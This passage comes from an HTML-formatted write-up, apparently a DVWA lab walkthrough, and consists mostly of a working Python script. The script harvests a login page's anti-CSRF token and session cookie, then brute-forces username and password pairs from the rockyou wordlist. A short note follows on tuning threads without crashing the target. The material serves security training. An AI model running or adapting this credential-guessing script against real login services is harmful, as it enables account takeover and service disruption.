&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;BeautifulSoup&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Variables&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;target&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'http://192.168.1.33/DVWA'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;user_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'/usr/share/seclists/Usernames/top_shortlist.txt'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;pass_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'/usr/share/seclists/Passwords/rockyou.txt'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Value to look for in response header (Whitelisting)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;success&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'index.php'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Get the anti-CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;csrf_token&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Make the request to the URL&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] URL: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/login.php&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{0}/login.php&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;allow_redirects&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[!] csrf_token: Failed to connect (URL: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/login.php).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Extract anti-CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;soup&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;user_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;soup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;user_token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;})[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;value&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] user_token: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Extract session information&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;session_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;PHPSESSID=(.*?);&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;set-cookie&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;session_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] session_id: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Make the request to-do the brute force&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;url_request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# POST data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;user_token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Cookie data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;PHPSESSID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Make the request to the URL&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;#print &amp;quot;\n[i] URL: %s/vulnerabilities/brute/&amp;quot; % target&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;#print &amp;quot;[i] Data: %s&amp;quot; % data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;#print &amp;quot;[i] Cookie: %s&amp;quot; % cookie&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{0}/login.php&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allow_redirects&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[!] url_request: Failed to connect (URL: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/vulnerabilities/brute/).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Wasn't it a redirect?&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;301&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;302&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error again) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[!] url_request: Page didn't response correctly (Response: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# We have what we need&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Location&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Main brute force loop&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute_force&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Load in wordlists files&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pass_list&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_list&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Counter&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Loop around&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;PASS&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;USER&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="n"&gt;USER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="n"&gt;PASS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;PASS&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Increase counter&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Feedback for the user&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;[i] Try &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt; // &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;USER&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PASS&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Fresh CSRF token each time?&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;#user_token, session_id = csrf_token()&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Make request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="n"&gt;attempt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;url_request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;USER&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PASS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;#print attempt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="c"&gt;# Check response&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;attempt&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;success&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[i] Found!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] Username: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;USER&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] Password: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PASS&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Get initial CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;csrf_token&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Start brute forcing&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;brute_force&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;a name="Summary"&gt;&lt;/a&gt;
&lt;h2&gt;Summary&lt;/h2&gt;

&lt;a name="Threads..amp..Waiting"&gt;&lt;/a&gt;
&lt;h3&gt;Threads &amp;amp; Waiting&lt;/h3&gt;

&lt;p&gt;A few notes about the threads &amp;amp; waiting...&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Brute forcing is slow&lt;/strong&gt;. So there's a huge urge to increase the threads, and lower the wait count, so you can do more in less. However... &lt;strong&gt;doing too much can kill the service, or at times the box completely&lt;/strong&gt;. There is &lt;strong&gt;no "magic number"&lt;/strong&gt; as there are various factors in play, such as:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;System resources of both attacker and target?

&lt;ul&gt;
&lt;li&gt;RAM? CPU?&lt;/li&gt;
